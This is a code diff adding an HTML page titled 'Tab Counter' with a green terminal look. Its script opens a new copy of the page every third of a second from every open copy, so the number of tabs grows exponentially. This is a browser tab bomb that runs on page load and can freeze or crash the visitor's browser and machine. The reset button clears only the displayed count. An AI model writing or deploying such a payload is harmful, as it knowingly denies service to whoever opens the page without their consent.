@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Tab Counter</title>
+    <style>
+        body {
+            background: #000;
+            color: #00ff41; /* Classic Matrix/CMD green */
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .counter-box {
+            border: 3px solid #00ff41;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 0 20px #00ff41;
+        }
+        #count {
+            font-size: 80px;
+            font-weight: bold;
+            display: block;
+        }
+        .reset-btn {
+            margin-top: 20px;
+            background: transparent;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            cursor: pointer;
+            padding: 5px 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="counter-box">
+        <h1>TABS SPAWNED</h1>
+        <span id="count">0</span>
+        <button class="reset-btn" onclick="resetCounter()">RESET COUNT</button>
+    </div>
+
+    <script>
+        const countDisplay = document.getElementById('count');
+        const myPath = window.location.href;
+
+        // 1. On load, increment the total count in localStorage
+        function incrementCounter() {
+            let currentCount = parseInt(localStorage.getItem('tab_total')) || 0;
+            currentCount++;
+            localStorage.setItem('tab_total', currentCount);
+            updateDisplay();
+        }
+
+        // 2. Update the number on the screen
+        function updateDisplay() {
+            const currentCount = localStorage.getItem('tab_total') || 0;
+            countDisplay.innerText = currentCount;
+        }
+
+        // 3. The spawning logic (3 per second)
+        function spawn() {
+            window.open(myPath, '_blank');
+        }
+
+        function resetCounter() {
+            localStorage.setItem('tab_total', 0);
+            updateDisplay();
+        }
+
+        // Initialize
+        incrementCounter();
+
+        // Listen for changes from other tabs so the counter updates live
+        window.addEventListener('storage', updateDisplay);
+
+        // Start spawning
+        setInterval(spawn, 333);
+    </script>
+</body>
+</html>
